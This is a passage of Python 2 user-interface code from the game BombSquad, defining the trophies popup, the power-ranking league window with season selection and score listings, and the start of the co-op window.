            pts = ach.getPowerRankingValue()
            bs.textWidget(
                parent=self._subContainer,
                position=(subWidth * 0.92, subHeight - 20 - incr * i),
                maxWidth=subWidth * 0.15, color=(0.7, 0.8, 1.0)
                if complete else(0.9, 0.9, 1.0, 0.3), flatness=1.0, shadow=0.0,
                scale=0.6, text=bs.Lstr(
                    resource=ptsRsrc, subs=[('${NUMBER}', str(pts))]),
                size=(0, 0),
                hAlign='center', vAlign='center')
            if complete:
                totalPts += pts

        bs.textWidget(parent=self._subContainer,
                      position=(subWidth * 1.0, subHeight - 20 - incr *
                                len(achievements)),
                      maxWidth=subWidth * 0.5, scale=0.7, color=(0.7, 0.8, 1.0),
                      flatness=1.0, shadow=0.0, text=bs.Lstr(
                          value='${A} ${B}',
                          subs=[('${A}', bs.Lstr(
                              resource='coopSelectWindow.totalText')),
                              ('${B}', bs.Lstr(
                                  resource=eqRsrc,
                                  subs=[('${NUMBER}', str(totalPts))]))]),
                      size=(0, 0),
                      hAlign='right', vAlign='center')

    def _onCancelPress(self):
        self._transitionOut()

    def _transitionOut(self):
        if not self._transitioningOut:
            self._transitioningOut = True
            bs.containerWidget(edit=self._rootWidget, transition='outScale')

    def onPopupCancel(self):
        bs.playSound(bs.getSound('swish'))
        self._transitionOut()


class TrophiesWindow(PopupWindow):

    def __init__(self, position, data, scale=None):

        self._data = data

        if scale is None:
            scale = 2.3 if gSmallUI else 1.65 if gMedUI else 1.23
        self._transitioningOut = False

        self._width = 300
        self._height = 300

        bgColor = (0.5, 0.4, 0.6)

        # creates our _rootWidget
        PopupWindow.__init__(self, position=position,
                             size=(self._width, self._height),
                             scale=scale, bgColor=bgColor)

        env = bs.getEnvironment()

        self._cancelButton = bs.buttonWidget(
            parent=self._rootWidget, position=(50, self._height - 30),
            size=(50, 50),
            scale=0.5, label='', color=bgColor,
            onActivateCall=self._onCancelPress, autoSelect=True,
            icon=bs.getTexture('crossOut'),
            iconScale=1.2)

        self._titleText = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 20),
            size=(0, 0),
            hAlign='center', vAlign='center', scale=0.6, text=bs.Lstr(
                resource='trophiesText'),
            maxWidth=200, color=(1, 1, 1, 0.4))

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, size=(self._width-60, self._height-70),
            position=(30, 30), captureArrows=True)
        bs.widget(edit=self._scrollWidget, autoSelect=True)

        bs.containerWidget(edit=self._rootWidget,
                           cancelButton=self._cancelButton)

        incr = 31
        subWidth = self._width-90

        trophyTypes = [
            ['0a'],
            ['0b'],
            ['1'],
            ['2'],
            ['3'],
            ['4'],
        ]
        subHeight = 40+len(trophyTypes)*incr

        eqText = bsUtils._getResource(
            'coopSelectWindow.powerRankingPointsEqualsText')

        self._subContainer = bs.containerWidget(
            parent=self._scrollWidget, size=(subWidth, subHeight),
            background=False)

        totalPts = 0

        ptsText = bsUtils._getResource(
            'coopSelectWindow.powerRankingPointsText')
        multText = bsUtils._getResource(
            'coopSelectWindow.powerRankingPointsMultText')
        numText = bsUtils._getResource('numberText')

        for i, trophyType in enumerate(trophyTypes):
            tCount = self._data['t'+trophyType[0]]
            tMult = self._data['t'+trophyType[0]+'m']
            have = True if tCount > 0 else False
            bs.textWidget(parent=self._subContainer,
                          position=(subWidth*0.15, subHeight-20-incr*i),
                          scale=0.7, flatness=1.0, shadow=0.7,
                          color=(1, 1, 1),
                          text=bs.getSpecialChar('trophy'+trophyType[0]),
                          size=(0, 0),
                          hAlign='center', vAlign='center')

            bs.textWidget(parent=self._subContainer,
                          position=(subWidth*0.31, subHeight-20-incr*i),
                          maxWidth=subWidth*0.2,
                          scale=0.8, flatness=1.0, shadow=0.0,
                          color=(0, 1, 0) if have else (0.6, 0.6, 0.6, 0.5),
                          text=str(tCount),
                          size=(0, 0),
                          hAlign='center', vAlign='center')

            t = multText.replace('${NUMBER}', str(tMult))
            bs.textWidget(
                parent=self._subContainer,
                position=(subWidth * 0.57, subHeight - 20 - incr * i),
                maxWidth=subWidth * 0.3, scale=0.4, flatness=1.0, shadow=0.0,
                color=(0.63, 0.6, 0.75) if have else(0.6, 0.6, 0.6, 0.4),
                text=t, size=(0, 0),
                hAlign='center', vAlign='center')

            pts = tCount*tMult
            bs.textWidget(
                parent=self._subContainer,
                position=(subWidth * 0.88, subHeight - 20 - incr * i),
                maxWidth=subWidth * 0.3, color=(0.7, 0.8, 1.0)
                if have else(0.9, 0.9, 1.0, 0.3), flatness=1.0, shadow=0.0,
                scale=0.5, text=eqText.replace('${NUMBER}', str(pts)),
                size=(0, 0),
                hAlign='center', vAlign='center')
            totalPts += pts

        bs.textWidget(
            parent=self._subContainer,
            position=(subWidth * 1.0, subHeight - 20 - incr * len(trophyTypes)),
            maxWidth=subWidth * 0.5, scale=0.7, color=(0.7, 0.8, 1.0),
            flatness=1.0, shadow=0.0, text=bsUtils._getResource(
                'coopSelectWindow.totalText') + ' ' + eqText.replace(
                '${NUMBER}', str(totalPts)),
            size=(0, 0),
            hAlign='right', vAlign='center')

    def _onCancelPress(self):
        self._transitionOut()

    def _transitionOut(self):
        if not self._transitioningOut:
            self._transitioningOut = True
            bs.containerWidget(edit=self._rootWidget, transition='outScale')

    def onPopupCancel(self):
        bs.playSound(bs.getSound('swish'))
        self._transitionOut()


class PowerRankingWindow(Window):

    def __init__(self, transition='inRight', modal=False, originWidget=None):

        bsInternal._setAnalyticsScreen('League Window')

        self._powerRankingInfo = None
        self._modal = modal

        # if they provided an origin-widget, scale up from that
        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None

        self._width = 1320 if gSmallUI else 1120
        xInset = 100 if gSmallUI else 0
        self._height = 657 if gSmallUI else 710 if gMedUI else 800
        self._r = 'coopSelectWindow'
        self._R = R = bsUtils._getResource(self._r)
        topExtra = 20 if gSmallUI else 0

        self._leagueURLArg = ''

        self._isCurrentSeason = False
        self._canDoMoreButton = True

        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height + topExtra),
            stackOffset=(0, -15) if gSmallUI else(0, 10) if gMedUI else(0, 0),
            transition=transition, scaleOriginStackOffset=scaleOrigin,
            scale=1.2 if gSmallUI else 0.93 if gMedUI else 0.8)

        self._backButton = b = bs.buttonWidget(
            parent=self._rootWidget,
            position=(75 + xInset, self._height - 87 - (4 if gSmallUI else 0)),
            size=(120, 60),
            scale=1.2, autoSelect=True, label=bs.Lstr(
                resource='doneText' if self._modal else 'backText'),
            buttonType=None if self._modal else 'back',
            onActivateCall=self._back)

        self._titleText = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 56),
            size=(0, 0),
            text=bs.Lstr(
                resource='league.leagueRankText',
                fallbackResource='coopSelectWindow.powerRankingText'),
            hAlign="center", color=gTitleColor, scale=1.4, maxWidth=600,
            vAlign="center")

        if gDoAndroidNav:
            bs.buttonWidget(
                edit=b, buttonType='backSmall',
                position=(75 + xInset, self._height - 87 -
                          (2 if gSmallUI else 0)),
                size=(60, 55),
                label=bs.getSpecialChar('back'))

        self._scrollWidth = self._width-(130+2*xInset)
        self._scrollHeight = self._height-160
        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, highlight=False, position=(65 + xInset, 70),
            size=(self._scrollWidth, self._scrollHeight),
            centerSmallContent=True)
        bs.widget(edit=self._scrollWidget, autoSelect=True)
        bs.containerWidget(edit=self._scrollWidget, claimsLeftRight=True)
        bs.containerWidget(
            edit=self._rootWidget, cancelButton=self._backButton,
            selectedChild=self._backButton)

        self._lastPowerRankingQueryTime = None
        self._doingPowerRankingQuery = False

        self._subContainer = None
        self._subContainerWidth = 800
        self._subContainerHeight = 483
        self._powerRankingScoreWidgets = []

        self._seasonPopupMenu = None
        self._requestedSeason = None
        self._season = None

        # take note of our account state; we'll refresh later if this changes
        self._accountState = bsInternal._getAccountState()

        self._refresh()
        self._restore_state()

        # if we've got cached power-ranking data already, display it
        info = _getCachedPowerRankingInfo()
        if info is not None:
            self._updateForPowerRankingInfo(info)

        self._updateTimer = bs.Timer(
            1000, bs.WeakCall(self._update),
            timeType='real', repeat=True)
        self._update(show=True if info is None else False)

    def _onAchievementsPress(self):
        # only allow this for all-time or the current season
        # (we currently don't keep specific achievement data for old seasons)
        if self._season == 'a' or self._isCurrentSeason:
            AchievementsWindow(
                position=self._powerRankingAchievementsButton\
                .getScreenSpaceCenter())
        else:
            bs.screenMessage(
                bs.Lstr(
                    resource='achievementsUnavailableForOldSeasonsText',
                    fallbackResource='unavailableText'),
                color=(1, 0, 0))
            bs.playSound(bs.getSound('error'))

    def _onActivityMultPress(self):
        t = bs.Lstr(
            resource='coopSelectWindow.activenessAllTimeInfoText'
            if self._season == 'a' else 'coopSelectWindow.activenessInfoText',
            subs=[('${MAX}',
                   str(
                       bsInternal._getAccountMiscReadVal(
                           'activenessMax', 1.0)))])
        ConfirmWindow(t, cancelButton=False, width=460, height=150,
                      originWidget=self._activityMultButton)

    def _onProMultPress(self):
        t = bs.Lstr(
            resource='coopSelectWindow.proMultInfoText',
            subs=[('${PERCENT}',
                   str(
                       bsInternal._getAccountMiscReadVal(
                           'proPowerRankingBoost', 10))),
                  ('${PRO}', bs.Lstr(
                      resource='store.bombSquadProNameText',
                      subs=[('${APP_NAME}', bs.Lstr(
                          resource='titleText'))]))])
        ConfirmWindow(
            t, cancelButton=False, width=460, height=130,
            originWidget=self._proMultButton)

    def _onTrophiesPress(self):
        info = self._powerRankingInfo
        if info is not None:
            TrophiesWindow(
                position=self._powerRankingTrophiesButton\
                .getScreenSpaceCenter(),
                data=info)
        else:
            bs.playSound(bs.getSound('error'))

    def _onPowerRankingQueryResponse(self, data):
        self._doingPowerRankingQuery = False
        # important: *only* cache this if we requested the current season..
        if data is not None and data.get('s', None) is None:
            _cachePowerRankingInfo(data)
        # always store a copy locally though (even for other seasons)
        self._powerRankingInfo = copy.deepcopy(data)
        self._updateForPowerRankingInfo(data)

    def _save_state(self):
        pass

    def _restore_state(self):
        pass

    def _update(self, show=False):

        curTime = bs.getRealTime()

        # if our account state has changed, refresh our UI
        accountState = bsInternal._getAccountState()
        if accountState != self._accountState:
            self._accountState = accountState
            self._save_state()
            self._refresh()

            # and power ranking too...
            if not self._doingPowerRankingQuery:
                self._lastPowerRankingQueryTime = None

        # send off a new power-ranking query if its been long enough or our
        # requested season has changed or whatnot..
        if not self._doingPowerRankingQuery and(
                self._lastPowerRankingQueryTime is None or curTime - self.
                _lastPowerRankingQueryTime > 30000):
            try:
                if show:
                    bs.textWidget(edit=self._leagueTitleText, text='')
                    bs.textWidget(edit=self._leagueText, text='')
                    bs.textWidget(edit=self._leagueNumberText, text='')
                    bs.textWidget(edit=self._yourPowerRankingText, text=bs.Lstr(
                        value='${A}...',
                        subs=[('${A}', bs.Lstr(resource='loadingText'))]))
                    bs.textWidget(edit=self._toRankedText, text='')
                    bs.textWidget(edit=self._powerRankingRankText, text='')
                    bs.textWidget(edit=self._seasonEndsText, text='')
                    bs.textWidget(edit=self._trophyCountsResetText, text='')
            except Exception as e:
                print 'EXC showing pr update msg', e

            self._lastPowerRankingQueryTime = curTime
            self._doingPowerRankingQuery = True
            bsInternal._powerRankingQuery(
                season=self._requestedSeason, callback=bs.WeakCall(
                    self._onPowerRankingQueryResponse))

    def _refresh(self):

        # (re)create the sub-container if need be..
        if self._subContainer is not None:
            self._subContainer.delete()
        self._subContainer = c = bs.containerWidget(
            parent=self._scrollWidget,
            size=(self._subContainerWidth, self._subContainerHeight),
            background=False)

        wParent = self._subContainer
        hBase = 6
        hSpacing = 200
        customButtons = []
        h = 0
        v = self._subContainerHeight - 20
        v2 = -2

        v -= 0

        h2 = 80
        v2 = v - 60
        countColor = (0.5, 1.0, 0.5)
        worthColor = (0.6, 0.6, 0.65)
        tallyColor = (0.5, 0.6, 0.8)
        spc = 43

        hOffsCount = 50
        hOffsPts = 140
        hOffsTally = 150
        ptsScale = 0.65
        ptsMaxWidth = 60
        tallyMaxWidth = 120
        countMaxWidth = 40
        hOffsIcons = -29
        iconScale = 1.4

        numText = bs.Lstr(resource='numberText').evaluate()

        v2 -= 70

        bs.textWidget(
            parent=wParent, position=(h2 - 60, v2 + 106),
            size=(0, 0),
            flatness=1.0, shadow=0.0, text=bs.Lstr(
                resource='coopSelectWindow.pointsText'),
            hAlign='left', vAlign='center', scale=0.8, color=(1, 1, 1, 0.3),
            maxWidth=200)

        self._powerRankingAchievementsButton = bs.buttonWidget(
            parent=wParent, position=(h2 - 60, v2 + 10),
            size=(200, 80),
            icon=bs.getTexture('achievementsIcon'),
            autoSelect=True, onActivateCall=bs.WeakCall(
                self._onAchievementsPress),
            upWidget=self._backButton, leftWidget=self._backButton,
            color=(0.5, 0.5, 0.6),
            textColor=(0.7, 0.7, 0.8),
            label='')

        self._powerRankingAchievementTotalText = bs.textWidget(
            parent=wParent, position=(h2 + hOffsTally, v2 + 45),
            size=(0, 0),
            flatness=1.0, shadow=0.0, text='-', hAlign='left', vAlign='center',
            scale=0.8, color=tallyColor, maxWidth=tallyMaxWidth)

        v2 -= 80

        self._powerRankingTrophiesButton = bs.buttonWidget(
            parent=wParent, position=(h2 - 60, v2 + 10),
            size=(200, 80),
            icon=bs.getTexture('medalSilver'),
            autoSelect=True, onActivateCall=bs.WeakCall(
                self._onTrophiesPress),
            leftWidget=self._backButton, color=(0.5, 0.5, 0.6),
            textColor=(0.7, 0.7, 0.8),
            label='')
        self._powerRankingTrophiesTotalText = bs.textWidget(
            parent=wParent, position=(h2 + hOffsTally, v2 + 45),
            size=(0, 0),
            flatness=1.0, shadow=0.0, text='-', hAlign='left', vAlign='center',
            scale=0.8, color=tallyColor, maxWidth=tallyMaxWidth)

        v2 -= 100

        bs.textWidget(
            parent=wParent, position=(h2 - 60, v2 + 86),
            size=(0, 0),
            flatness=1.0, shadow=0.0, text=bs.Lstr(
                resource='coopSelectWindow.multipliersText'),
            hAlign='left', vAlign='center', scale=0.8, color=(1, 1, 1, 0.3),
            maxWidth=200)

        if bsInternal._getAccountMiscReadVal('act', False):
            self._activityMultButton = bs.buttonWidget(
                parent=wParent, position=(h2 - 60, v2 + 10),
                size=(200, 60),
                icon=bs.getTexture('heart'),
                iconColor=(0.5, 0, 0.5),
                label=bs.Lstr(resource='coopSelectWindow.activityText'),
                autoSelect=True, onActivateCall=bs.WeakCall(
                    self._onActivityMultPress),
                leftWidget=self._backButton, color=(0.5, 0.5, 0.6),
                textColor=(0.7, 0.7, 0.8))

            self._activityMultText = bs.textWidget(
                parent=wParent, position=(h2 + hOffsTally, v2 + 40),
                size=(0, 0),
                flatness=1.0, shadow=0.0, text='-', hAlign='left',
                vAlign='center', scale=0.8, color=tallyColor,
                maxWidth=tallyMaxWidth)
            v2 -= 65
        else:
            self._activityMultButton = None

        self._proMultButton = bs.buttonWidget(
            parent=wParent, position=(h2 - 60, v2 + 10),
            size=(200, 60),
            icon=bs.getTexture('logo'),
            iconColor=(0.3, 0, 0.3),
            label=bs.Lstr(
                resource='store.bombSquadProNameText',
                subs=[('${APP_NAME}', bs.Lstr(resource='titleText'))]),
            autoSelect=True, onActivateCall=bs.WeakCall(self._onProMultPress),
            leftWidget=self._backButton, color=(0.5, 0.5, 0.6),
            textColor=(0.7, 0.7, 0.8))

        self._proMultText = bs.textWidget(
            parent=wParent, position=(h2 + hOffsTally, v2 + 40),
            size=(0, 0),
            flatness=1.0, shadow=0.0, text='-', hAlign='left', vAlign='center',
            scale=0.8, color=tallyColor, maxWidth=tallyMaxWidth)
        v2 -= 30

        v2 -= spc
        bs.textWidget(
            parent=wParent, position=(h2 + hOffsTally - 10 - 40, v2 + 35),
            size=(0, 0),
            flatness=1.0, shadow=0.0, text=bs.Lstr(
                resource='finalScoreText'),
            hAlign='right', vAlign='center', scale=0.9, color=worthColor,
            maxWidth=150)
        self._powerRankingTotalText = bs.textWidget(
            parent=wParent, position=(h2 + hOffsTally - 40, v2 + 35),
            size=(0, 0),
            flatness=1.0, shadow=0.0, text='-', hAlign='left', vAlign='center',
            scale=0.9, color=tallyColor, maxWidth=tallyMaxWidth)

        self._seasonShowText = bs.textWidget(
            parent=wParent, position=(390 - 15, v - 20),
            size=(0, 0),
            color=(0.6, 0.6, 0.7),
            maxWidth=200, text=bs.Lstr(resource='showText'),
            hAlign='right', vAlign='center', scale=0.8, shadow=0, flatness=1.0)

        self._leagueTitleText = bs.textWidget(
            parent=wParent, position=(470, v - 97),
            size=(0, 0),
            color=(0.6, 0.6, 0.7),
            maxWidth=230, text='', hAlign='center', vAlign='center', scale=0.9,
            shadow=0, flatness=1.0)

        self._leagueTextScale = 1.8
        self._leagueTextMaxWidth = 210
        self._leagueText = bs.textWidget(
            parent=wParent, position=(470, v - 140),
            size=(0, 0),
            color=(1, 1, 1),
            maxWidth=self._leagueTextMaxWidth, text='-', hAlign='center',
            vAlign='center', scale=self._leagueTextScale, shadow=1.0,
            flatness=1.0)
        self._leagueNumberBasePos = (470, v-140)
        self._leagueNumberText = bs.textWidget(
            parent=wParent, position=(470, v - 140),
            size=(0, 0),
            color=(1, 1, 1),
            maxWidth=100, text='', hAlign='left', vAlign='center', scale=0.8,
            shadow=1.0, flatness=1.0)

        self._yourPowerRankingText = bs.textWidget(
            parent=wParent, position=(470, v - 142 - 70),
            size=(0, 0),
            color=(0.6, 0.6, 0.7),
            maxWidth=230, text='', hAlign='center', vAlign='center', scale=0.9,
            shadow=0, flatness=1.0)

        self._toRankedText = bs.textWidget(
            parent=wParent, position=(470, v - 250 - 70),
            size=(0, 0),
            color=(0.6, 0.6, 0.7),
            maxWidth=230, text='', hAlign='center', vAlign='center', scale=0.8,
            shadow=0, flatness=1.0)

        self._powerRankingRankText = bs.textWidget(
            parent=wParent, position=(473, v - 210 - 70),
            size=(0, 0),
            big=False, text='-', hAlign='center', vAlign='center', scale=1.0)

        self._seasonEndsText = bs.textWidget(
            parent=wParent, position=(470, v - 380),
            size=(0, 0),
            color=(0.6, 0.6, 0.6),
            maxWidth=230, text='', hAlign='center', vAlign='center', scale=0.9,
            shadow=0, flatness=1.0)
        self._trophyCountsResetText = bs.textWidget(
            parent=wParent, position=(470, v - 410),
            size=(0, 0),
            color=(0.5, 0.5, 0.5),
            maxWidth=230, text=('Trophy counts will reset next season.'),
            hAlign='center', vAlign='center', scale=0.8, shadow=0, flatness=1.0)

        self._powerRankingScoreWidgets = []

        self._powerRankingScoreV = v - 56

        h = 707
        v -= 451

        self._seeMoreButton = bs.buttonWidget(
            parent=wParent, label=self._R.seeMoreText, position=(h, v),
            color=(0.5, 0.5, 0.6),
            textColor=(0.7, 0.7, 0.8),
            size=(230, 60),
            autoSelect=True, onActivateCall=bs.WeakCall(self._onMorePress))

    def _onMorePress(self):
        if not self._canDoMoreButton:
            bs.playSound(bs.getSound('error'))
            bs.screenMessage(
                bs.Lstr(resource='unavailableText'),
                color=(1, 0, 0))
            return
        seasonStr = '' if self._season is None else '&season=' + \
            ('all_time' if self._season == 'a' else self._season)
        if self._leagueURLArg != '':
            leagueStr = '&league='+self._leagueURLArg
        else:
            leagueStr = ''
        bs.openURL(
            bsInternal._get_master_server_address() +
            '/highscores?list=powerRankings&v=2' + leagueStr + seasonStr,
            aa='player')

    def _updateForPowerRankingInfo(self, data):

        if not self._rootWidget.exists():
            return

        inTop = True if (
            data is not None and data['rank'] is not None) else False

        eqText = self._R.powerRankingPointsEqualsText
        ptsText = self._R.powerRankingPointsText
        numText = bs.Lstr(resource='numberText').evaluate()

        doPercent = False
        finishedSeasonUnranked = False
        self._canDoMoreButton = True
        if bsInternal._getAccountState() != 'SIGNED_IN':
            status_text = '('+bs.Lstr(resource='notSignedInText').evaluate()+')'
        elif inTop:
            status_text = numText.replace('${NUMBER}', str(data['rank']))
        elif data is not None:
            try:
                # handle old seasons where we didn't wind up ranked at the end..
                if len(data['scores']) == 0:
                    status_text = self._R.powerRankingFinishedSeasonUnrankedText
                    extraText = ''
                    finishedSeasonUnranked = True
                    self._canDoMoreButton = False
                else:
                    ourPoints = _getPowerRankingPoints(data)
                    progress = float(ourPoints)/max(1, data['scores'][-1][1])
                    status_text = str(int(progress*100.0))+'%'
                    extraText = ('\n'+self._R.powerRankingPointsToRankedText\
                                 .replace('${CURRENT}', str(ourPoints)).replace(
                                     '${REMAINING}',
                                     str(data['scores'][-1][1])))
                    doPercent = True
            except Exception:
                bs.printException('error updating power ranking')
                status_text = self._R.powerRankingNotInTopText.replace(
                    '${NUMBER}', str(data['listSize']))
                extraText = ''
        else:
            status_text = '-'

        self._season = data['s'] if data is not None else None

        v = self._subContainerHeight - 20
        popupWasSelected = False
        if self._seasonPopupMenu is not None:
            b = self._seasonPopupMenu.getButtonWidget()
            if self._subContainer.getSelectedChild() == b:
                popupWasSelected = True
            b.delete()
        seasonChoices = []
        seasonChoicesDisplay = []
        didFirst = False
        self._isCurrentSeason = False
        if data is not None:
            # build our list of seasons we have available
            for s in data['sl']:
                seasonChoices.append(s)
                if s != 'a' and not didFirst:
                    seasonChoicesDisplay.append(
                        bs.Lstr(
                            resource='league.currentSeasonText',
                            subs=[('${NUMBER}', s)]))
                    didFirst = True
                    # if we either did not specify a season or specified the
                    # first, we're looking at the current..
                    if self._season in[s, None]:
                        self._isCurrentSeason = True
                elif s == 'a':
                    seasonChoicesDisplay.append(
                        bs.Lstr(resource='league.allTimeText'))
                else:
                    seasonChoicesDisplay.append(
                        bs.Lstr(
                            resource='league.seasonText',
                            subs=[('${NUMBER}', s)]))
            self._seasonPopupMenu = PopupMenu(
                parent=self._subContainer, position=(390, v - 45),
                width=150, buttonSize=(200, 50),
                choices=seasonChoices, onValueChangeCall=bs.WeakCall(
                    self._onSeasonChange),
                choicesDisplay=seasonChoicesDisplay, currentChoice=self._season)
            if popupWasSelected:
                bs.containerWidget(
                    edit=self._subContainer,
                    selectedChild=self._seasonPopupMenu.getButtonWidget())
            bs.widget(edit=self._seeMoreButton, showBufferBottom=100)
            bs.widget(
                edit=self._seasonPopupMenu.getButtonWidget(),
                upWidget=self._backButton)
            bs.widget(
                edit=self._backButton,
                downWidget=self._powerRankingAchievementsButton,
                rightWidget=self._seasonPopupMenu.getButtonWidget())

        bs.textWidget(edit=self._leagueTitleText, text=''
                      if self._season == 'a' else bs.Lstr(
                          resource='league.leagueText'))

        if data is None:
            lName = ''
            lNum = ''
            lColor = (1, 1, 1)
            self._leagueURLArg = ''
        elif self._season == 'a':
            lName = bs.Lstr(resource='league.allTimeText').evaluate()
            lNum = ''
            lColor = (1, 1, 1)
            self._leagueURLArg = ''
        else:
            lNum = ('['+str(data['l']['i'])+']') if data['l']['i2'] else ''
            lName = bs.Lstr(translate=(
                'leagueNames', data['l']['n'])).evaluate()
            lColor = data['l']['c']
            self._leagueURLArg = (
                data['l']['n']+'_'+str(data['l']['i'])).lower()

        if data is None or self._season == 'a' or data['se'] is None:
            daysToEnd = 0
            minutesToEnd = 0
            toEndString = ''
            showSeasonEnd = False
        else:
            showSeasonEnd = True
            daysToEnd = data['se'][0]
            minutesToEnd = data['se'][1]
            if daysToEnd > 0:
                toEndString = bs.Lstr(
                    resource='league.seasonEndsDaysText',
                    subs=[('${NUMBER}', str(daysToEnd))])
            elif daysToEnd == 0 and minutesToEnd >= 60:
                toEndString = bs.Lstr(
                    resource='league.seasonEndsHoursText',
                    subs=[('${NUMBER}', str(minutesToEnd / 60))])
            elif daysToEnd == 0 and minutesToEnd >= 0:
                toEndString = bs.Lstr(
                    resource='league.seasonEndsMinutesText',
                    subs=[('${NUMBER}', str(minutesToEnd))])
            else:
                toEndString = bs.Lstr(
                    resource='league.seasonEndedDaysAgoText',
                    subs=[('${NUMBER}', str(-(daysToEnd + 1)))])

        bs.textWidget(edit=self._seasonEndsText, text=toEndString)
        bs.textWidget(edit=self._trophyCountsResetText, text=bs.Lstr(
            resource='league.trophyCountsResetText')
            if self._isCurrentSeason and showSeasonEnd else '')

        bs.textWidget(edit=self._leagueText, text=lName, color=lColor)
        lTextWidth = min(self._leagueTextMaxWidth, bsInternal._getStringWidth(
            lName, suppressWarning=True)*self._leagueTextScale)
        bs.textWidget(
            edit=self._leagueNumberText, text=lNum, color=lColor,
            position=(self._leagueNumberBasePos[0]+lTextWidth*0.5+8,
                      self._leagueNumberBasePos[1]+10))
        bs.textWidget(
            edit=self._toRankedText, text=bs.Lstr(
                resource='coopSelectWindow.toRankedText').evaluate() + '' +
            extraText if doPercent else '')

        bs.textWidget(
            edit=self._yourPowerRankingText, text=bs.Lstr(
                resource='rankText',
                fallbackResource='coopSelectWindow.yourPowerRankingText')
            if(not doPercent) else '')

        bs.textWidget(edit=self._powerRankingRankText,
                      position=(473, v - 70 - (170 if doPercent else 220)),
                      text=status_text, big=True
                      if(inTop or doPercent) else False, scale=3.0
                      if(inTop or doPercent) else 0.7
                      if finishedSeasonUnranked else 1.0)

        if self._activityMultButton is not None:
            if data is None or data['act'] is None:
                bs.buttonWidget(
                    edit=self._activityMultButton,
                    textColor=(0.7, 0.7, 0.8, 0.5),
                    iconColor=(0.5, 0, 0.5, 0.3))
                bs.textWidget(edit=self._activityMultText, text='     -')
            else:
                bs.buttonWidget(
                    edit=self._activityMultButton,
                    textColor=(0.7, 0.7, 0.8, 1.0),
                    iconColor=(0.5, 0, 0.5, 1.0))
                bs.textWidget(edit=self._activityMultText,
                              text='x '+('%.2f' % data['act']))

        havePro = False if data is None else data['p']
        proMult = 1.0 + float(bsInternal._getAccountMiscReadVal(
            'proPowerRankingBoost', 0.0)) * 0.01
        bs.textWidget(edit=self._proMultText, text='     -'
                      if(data is None or not havePro) else 'x ' +
                      ('%.2f' % proMult))
        bs.buttonWidget(
            edit=self._proMultButton,
            textColor=(0.7, 0.7, 0.8, (1.0 if havePro else 0.5)),
            iconColor=(0.5, 0, 0.5) if havePro else(0.5, 0, 0.5, 0.2))
        bs.buttonWidget(edit=self._powerRankingAchievementsButton,
                        label=('' if data is None else(str(data['a']) + ' ')) +
                        bs.Lstr(resource='achievementsText').evaluate())

        # for the achievement value, use the number they gave us for
        # non-current seasons; otherwise calc our own
        totalAchValue = 0
        for ach in bsAchievement.gAchievements:
            if ach.isComplete():
                totalAchValue += ach.getPowerRankingValue()
        if self._season != 'a' and not self._isCurrentSeason:
            if data is not None and 'at' in data:
                totalAchValue = data['at']

        bs.textWidget(
            edit=self._powerRankingAchievementTotalText, text='-'
            if data is None
            else('+ ' + ptsText.replace('${NUMBER}', str(totalAchValue))))

        totalTrophiesCount = _getPowerRankingPoints(data, 'trophyCount')
        totalTrophiesValue = _getPowerRankingPoints(data, 'trophies')
        bs.buttonWidget(
            edit=self._powerRankingTrophiesButton,
            label=('' if data is None else ( str(totalTrophiesCount)+' '))
            +bs.Lstr(resource='trophiesText').evaluate())
        bs.textWidget(
            edit=self._powerRankingTrophiesTotalText, text='-'
            if data is None
            else(
                '+ ' + ptsText.replace('${NUMBER}', str(totalTrophiesValue))))

        bs.textWidget(
            edit=self._powerRankingTotalText, text='-'
            if data is None else eqText.replace(
                '${NUMBER}', str(_getPowerRankingPoints(data))))
        for w in self._powerRankingScoreWidgets:
            w.delete()
        self._powerRankingScoreWidgets = []

        scores = data['scores'] if data is not None else []

        tallyColor = (0.5, 0.6, 0.8)
        wParent = self._subContainer
        v2 = self._powerRankingScoreV

        for s in scores:
            h2 = 680
            isUs = s[3]
            self._powerRankingScoreWidgets.append(
                bs.textWidget(
                    parent=wParent, position=(h2 - 20, v2),
                    size=(0, 0),
                    color=(1, 1, 1) if isUs else(0.6, 0.6, 0.7), maxWidth=40,
                    flatness=1.0, shadow=0.0, text=numText.replace(
                        '${NUMBER}', str(s[0])),
                    hAlign='right', vAlign='center', scale=0.5))
            self._powerRankingScoreWidgets.append(bs.textWidget(
                parent=wParent,
                position=(h2 + 20, v2),
                size=(0, 0),
                color=(1, 1, 1)
                if isUs else tallyColor,
                maxWidth=60,
                text=str(s[1]),
                flatness=1.0, shadow=0.0,
                hAlign='center',
                vAlign='center',
                scale=0.7))
            t = bs.textWidget(
                parent=wParent, position=(h2 + 60, v2 - (28 * 0.5) / 0.9),
                size=(210 / 0.9, 28),
                color=(1, 1, 1) if isUs else(0.6, 0.6, 0.6), maxWidth=210,
                flatness=1.0, shadow=0.0, autoSelect=True, selectable=True,
                clickActivate=True, text=s[2],
                hAlign='left', vAlign='center', scale=0.9)
            self._powerRankingScoreWidgets.append(t)
            bs.textWidget(
                edit=t, onActivateCall=bs.Call(
                    self._showAccountInfo, s[4],
                    t))
            bs.widget(edit=t, leftWidget=self._seasonPopupMenu.getButtonWidget())
            v2 -= 28

    def _showAccountInfo(self, accountID, textWidget):
        bs.playSound(bs.getSound('swish'))
        AccountInfoWindow(accountID=accountID,
                          position=textWidget.getScreenSpaceCenter())

    def _onSeasonChange(self, value):
        self._requestedSeason = value
        self._lastPowerRankingQueryTime = None  # make sure we update asap
        self._update(show=True)

    def _save_state(self):
        pass

    def _back(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        if not self._modal:
            uiGlobals['mainMenuWindow'] = CoopWindow(
                transition='inLeft').getRootWidget()


class CoopWindow(Window):

    def _updateCornerButtonPositions(self):
        offs = -55 if gSmallUI and bsInternal._isPartyIconVisible() else 0
        if self._powerRankingButtonInstance is not None:
            self._powerRankingButtonInstance.setPosition(
                (self._width-282+offs-self._xInset,
                 self._height-85-(4 if gSmallUI else 0)))
        if self._storeButtonInstance is not None:
            self._storeButtonInstance.setPosition(
                (self._width-170+offs-self._xInset,
                 self._height-85-(4 if gSmallUI else 0)))

    def __init__(self, transition='inRight', originWidget=None):

